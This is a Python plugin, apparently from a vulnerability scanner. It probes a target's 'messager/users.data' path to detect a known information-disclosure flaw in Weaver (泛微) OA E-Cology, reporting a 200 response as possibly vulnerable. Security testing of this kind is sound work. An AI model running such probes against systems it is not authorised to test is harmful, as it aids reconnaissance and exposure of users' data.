import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


def E_Cology_user_data(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = urldata + 'messager/users.data'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200:
            print(Vcolors.RED + "[!] 可能存在泛微OA E-Cology 敏感信息泄漏漏洞:{}\r".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA E-Cology 敏感信息泄漏漏洞" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n",e)
        logging.error("E_Cology_user_data脚本出现异常")
  
        


